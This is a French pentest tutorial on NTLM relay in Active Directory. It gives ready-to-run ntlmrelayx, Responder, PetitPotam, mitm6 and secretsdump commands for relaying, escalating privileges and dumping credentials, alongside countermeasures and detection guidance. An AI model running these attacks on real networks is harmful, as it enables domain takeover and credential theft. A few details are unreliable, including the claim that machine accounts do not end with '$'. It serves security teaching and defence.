---
title: "NTLM Relay"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Active Directory"
tags: [ntlm, relay, smb, ldap, active-directory, impacket, responder, pentest, sécurité]
date: "2026-03-23"
prerequis: ["[[Active Directory Security]]"]
---

# NTLM Relay

Le NTLM relay consiste à relayer une authentification NTLM capturée vers un autre service pour s'y authentifier sans connaître le mot de passe. C'est l'une des attaques les plus dévastatrices en environnement Active Directory, pouvant mener directement au compromis du domaine.

> [!important] Distinction clé
> Le relay NTLM ne casse rien et ne vole aucun hash à cracker — l'attaquant se contente de se placer au milieu d'une authentification en cours et de la retransmettre en temps réel vers une cible différente de celle prévue par la victime. C'est le SMB Signing (ou l'EPA côté HTTP/LDAP) qui empêche ce détournement, pas la force du mot de passe.

> [!abstract] Définition — NTLM Relay
> Attaque d'homme du milieu qui intercepte une authentification NTLM et la retransmet en temps réel vers un autre serveur que celui visé par la victime. L'attaquant n'obtient ni hash ni mot de passe : il réutilise la session authentifiée tant que le service cible n'exige pas de signature. Le SMB Signing, la signature LDAP et l'EPA sont les protections qui bloquent ce détournement.

## Rappel du protocole NTLM

NTLM authentifie par défi-réponse, en trois messages. Le client annonce qu'il veut s'authentifier (`NEGOTIATE_MESSAGE`), le serveur lui renvoie un défi, c'est-à-dire huit octets aléatoires (`CHALLENGE_MESSAGE`), et le client répond en chiffrant ce défi avec le hash de son mot de passe (`AUTHENTICATE_MESSAGE`). Le serveur, qui connaît le hash, vérifie la réponse. La version NTLMv1 calcule cette réponse avec du DES et se casse en quelques minutes ; NTLMv2, plus robuste, ajoute un horodatage et un HMAC-MD5.

La faille exploitée par le relais est que rien, dans ce protocole, ne lie l'authentification au serveur auquel elle était destinée. L'attaquant se place au milieu : il reçoit le NEGOTIATE du client, le transmet au serveur cible, récupère le défi de celui-ci, le renvoie au client, reçoit la réponse du client et la transmet enfin à la cible. Celle-ci valide la réponse et considère l'attaquant comme authentifié, sans que ni le client ni le serveur n'aient rien remarqué.

## Prérequis et conditions

Le relais ne réussit que si le service cible n'exige pas de **signature**, car c'est la signature qui lie une session à l'authentification qui l'a ouverte. Trois conditions ouvrent la voie. D'abord, la signature SMB doit être désactivée ou simplement « activée mais non requise » sur la cible : c'est le cas par défaut des serveurs, moins des contrôleurs de domaine et des postes récents, et on le vérifie avec `nmap --script smb2-security-mode`. Ensuite, la signature LDAP et le *channel binding* ne doivent pas être imposés sur les contrôleurs de domaine ; depuis 2020 ils sont activés mais rarement en mode strict, donc souvent exploitables. Enfin, l'EPA (*Extended Protection for Authentication*), qui lie l'authentification au canal TLS, doit être absente des services web comme IIS, Exchange ou ADCS pour autoriser un relais vers eux.

À l'inverse, le relais échoue dans trois cas : d'un service SMB vers un autre si la signature SMB est requise, d'un relais NTLM vers du Kerberos (ce sont deux protocoles distincts), et vers un service web où l'EPA est activée.

## Découverte des cibles relay

```bash
# Scanner SMB Signing sur tout un réseau
nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Résultat à chercher :
# | smb2-security-mode:
# |   Message signing enabled but not required  ← VULNÉRABLE (relay possible)
# |   Message signing enabled and required      ← PROTÉGÉ

# CrackMapExec — plus rapide
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# → relay_targets.txt : liste des machines sans SMB signing

# Lister les cibles LDAP sans channel binding enforced
nxc ldap 192.168.1.0/24 -u '' -p '' --query "(objectClass=*)" "*"
```

## ntlmrelayx — Outil principal

```bash
# Installation (impacket)
pip install impacket

# Relay SMB → SMB (dump SAM sur la cible)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay SMB → SMB avec exécution de commande
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\\Windows\\Temp\\out.txt"

# Relay SMB → LDAP (plus impactant — opérations AD)
impacket-ntlmrelayx -t ldap://DC01.domaine.local -smb2support

# Relay SMB → LDAPS
impacket-ntlmrelayx -t ldaps://DC01.domaine.local -smb2support --remove-mic

# Relay avec dump automatique des secrets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --dump-lm

# Interface interactive SOCKS (relay persistent)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# → Crée des connexions SOCKS réutilisables après relay
# → Dans une autre fenêtre :
# proxychains secretsdump.py -no-pass domaine/admin@192.168.1.10
```

## Déclenchement du relay — Forcer les authentifications

```bash
# Méthode 1 — Responder (poisoning LLMNR/NBT-NS) + ntlmrelayx
# ATTENTION : Responder et ntlmrelayx ne peuvent pas écouter sur le même port SMB
# → Désactiver SMB et HTTP dans Responder

# Modifier /etc/responder/Responder.conf
SMB = Off
HTTP = Off

# Lancer Responder
responder -I eth0 -rdwv

# Lancer ntlmrelayx en parallèle
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Méthode 2 — PetitPotam (forcer l'authentification d'une machine spécifique)
# Ne nécessite pas de credentials (variante non authentifiée)
python3 PetitPotam.py -u '' -p '' 192.168.1.100 DC01.domaine.local
# → DC01 s'authentifie vers 192.168.1.100 → ntlmrelayx le capture et le relaie

# PetitPotam avec credentials (variante authentifiée — plus fiable)
python3 PetitPotam.py -u alice -p Password123 192.168.1.100 DC01.domaine.local

# Méthode 3 — PrinterBug (MS-RPRN)
python3 printerbug.py domaine.local/alice:Password123@DC01 192.168.1.100

# Méthode 4 — Mitm6 (IPv6 rogue DHCPv6 + DNS)
# Empoisonne le DHCPv6, se positionne comme DNS IPv6
# Redirige les authentifications WPAD/proxy vers ntlmrelayx
python3 mitm6.py -d domaine.local

# Combiner mitm6 + ntlmrelayx → relay HTTP vers LDAP
impacket-ntlmrelayx -6 -t ldaps://DC01.domaine.local -wh attacker-wpad \
    -l /tmp/loot --delegate-access
```

## Relay LDAP — Attaques avancées

```bash
# Relay vers LDAP → ajouter un utilisateur dans Domain Admins
impacket-ntlmrelayx -t ldap://DC01.domaine.local \
    -smb2support \
    --escalate-user alice     # Donner des privilèges à alice

# Relay vers LDAP → créer un nouveau compte admin
impacket-ntlmrelayx -t ldap://DC01.domaine.local -smb2support --add-computer

# Relay vers LDAP → activer la délégation (RBCD)
# Si on relaie le compte machine d'un serveur → configurer RBCD vers un serveur cible
impacket-ntlmrelayx -t ldaps://DC01.domaine.local -smb2support \
    --delegate-access --escalate-user 'SRV01$'

# Relay vers ADCS (Active Directory Certificate Services) → ESC8
impacket-ntlmrelayx -t http://CA.domaine.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# Après relay vers ADCS : certificat du DC → PKINIT → hash NTLM → DCSync
```

## Relay via SOCKS — Utilisation persistante

```bash
# Mode SOCKS — maintenir les sessions relayées pour une utilisation ultérieure
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# Liste des sessions SOCKS disponibles
# ntlmrelayx affiche dans la console :
# [*] SMBD-Thread-1: Received connection from 192.168.1.50, attacking target smb://192.168.1.10
# [*] Authenticating against smb://192.168.1.10 as DOMAINE/ALICE SUCCEED
# [*] SOCKS: Adding DOMAINE/ALICE@192.168.1.10(445) to active SOCKS connection. Enjoy

# Configurer proxychains pour le SOCKS de ntlmrelayx (port 1080)
# /etc/proxychains4.conf
# socks4 127.0.0.1 1080

# Utiliser les sessions relayées sans mot de passe
proxychains secretsdump.py DOMAINE/ALICE@192.168.1.10 -no-pass
proxychains smbexec.py DOMAINE/ALICE@192.168.1.10 -no-pass
proxychains mssqlclient.py DOMAINE/ALICE@192.168.1.10 -windows-auth -no-pass
```

## Cross-protocol relay

Le relais devient particulièrement puissant quand il change de protocole en chemin, car les protections diffèrent d'un service à l'autre. Le relais **HTTP vers SMB** exploite WPAD : les machines Windows cherchent un fichier de configuration de proxy sur `wpad.domaine.local`, et si l'attaquant répond à ce nom, il récupère une authentification HTTP qu'il relaie vers SMB. Le relais **HTTP vers LDAP**, très courant avec mitm6 ou WPAD, est redoutable parce que les opérations LDAP sensibles, comme ajouter un administrateur ou configurer une délégation RBCD, n'exigent pas la même signature que SMB.

Deux variantes historiques méritent d'être connues. **PrivExchange** force un serveur Exchange, qui dispose par défaut de droits étendus sur l'annuaire, à s'authentifier vers l'attaquant, qui relaie alors vers LDAP pour obtenir des droits de DCSync ; l'attaque est devenue moins courante depuis les correctifs de 2019. **WebDAV vers SMB**, enfin, déclenche une authentification HTTP via WebDAV pour la relayer vers des machines SMB non signées, ce qui contourne les restrictions sur les flux SMB directs.

## Contre-mesures

La contre-mesure fondamentale est la **signature SMB**, à exiger (mode *Required*) sur toutes les machines et pas seulement sur les contrôleurs de domaine, par GPO. Son coût est négligeable, un peu de CPU et un impact réseau minime, et elle rend tout relais vers SMB impossible. De même, il faut imposer la **signature LDAP** et le **channel binding** sur les contrôleurs de domaine (depuis le correctif KB4520412), ce qui ferme la voie du relais vers l'annuaire.

Il faut ensuite **tarir la source des authentifications spontanées**. Désactiver LLMNR et NetBIOS over TCP/IP empêche l'empoisonnement de résolution de noms qui permet à Responder de capturer des authentifications, et déployer WPAD par une entrée DNS légitime évite que les clients ne le cherchent par diffusion. Si IPv6 n'est pas utilisé, le désactiver, ou protéger le réseau par du *DHCPv6 snooping*, neutralise l'attaque mitm6. Enfin, activer l'**EPA** sur IIS, Exchange et ADCS lie l'authentification au canal TLS et rend le relais vers ces services web inopérant.

Côté **détection**, on surveille les authentifications NTLM venant de sources inattendues (événements 4624 et 4776), les ajouts de comptes dans les groupes d'administration (4728 et 4732) et, dans LDAP, toute modification de l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, signe d'une configuration de délégation malveillante.

## Pièges courants

> [!warning] Pièges courants
> - **NTLM Relay vs Pass-the-Hash — différence cruciale** : Pass-the-Hash réutilise un hash NTLM connu pour s'authentifier. NTLM Relay **n'a pas besoin du hash** — on intercepte et on relaie l'auth en temps réel vers une cible. Pas de cracking, pas de hash extrait.
> - **SMB Signing requis = relay vers SMB impossible** : Windows 10/11 client a SMB Signing requis par défaut. Les Servers, généralement non. Toujours `nxc smb 192.168.1.0/24 --gen-relay-list` pour identifier les cibles vulnérables avant de lancer Responder.
> - **Désactiver SMB et HTTP dans Responder.conf** : sinon Responder gère lui-même les sessions et ne les relaie pas. Erreur classique qui fait que ntlmrelayx ne reçoit rien.
> - **Relay vers le même hôte = impossible** : on ne peut pas relayer une auth de `host-A` vers `host-A` lui-même (Microsoft a patché ça avec MS08-068). Le relai ne marche qu'entre hôtes différents.
> - **EPA bloque le relay HTTP → LDAPS** : Extended Protection for Authentication lie l'authentification au canal TLS. Si activée sur LDAPS ou ADCS, le relay HTTPS échoue. Vérifier dans IIS / paramètres Exchange.
> - **mitm6 fait des dégâts** : redirige tout le DNS IPv6 du réseau → casse les apps qui utilisent IPv6 (Microsoft Teams, Edge, certains services internes). À ne pas laisser tourner en continu sur un grand réseau.
> - **Comptes machines (ne finissant pas par $) vs Comptes user** : un relay réussi avec un compte machine donne un shell SYSTEM sur la cible. Avec un compte user admin local, idem. Avec un compte user non-admin, on n'a que les droits limités du user.
> - **PetitPotam patché partiellement** : la version sans creds (anonyme) ne marche plus sur Windows récents. Mais avec un compte de base du domaine, ça marche encore. Bug de "feature", pas de "code".
> - **ntlmrelayx `--target-port` pour les services non-standards** : si l'auth tombe sur un AD CS sur port 8443 au lieu de 443, sans `--target-port 8443`, ça échoue silencieusement. Bien spécifier.
> - **`-c` pour exécution de commande, `-e` pour script** : confusion classique des options. `-c "powershell ..."` exécute une commande shell. `-e payload.exe` exécute un binaire local sur la cible relayée. Lire la sortie.
> - **Drop the MIC (CVE-2019-1040)** : permet de bypass le MIC (Message Integrity Check) NTLM, donc relay même sur des services protégés. À tester systématiquement avec `--remove-mic`.

> [!quiz] Pourquoi désactiver SMB et HTTP dans Responder.conf lors d'un relay avec ntlmrelayx ?
> Parce que les deux outils ne peuvent pas écouter sur les mêmes ports : si Responder garde SMB et HTTP actifs, il termine lui-même les authentifications au lieu de les transmettre. ntlmrelayx ne reçoit alors aucune connexion à relayer.
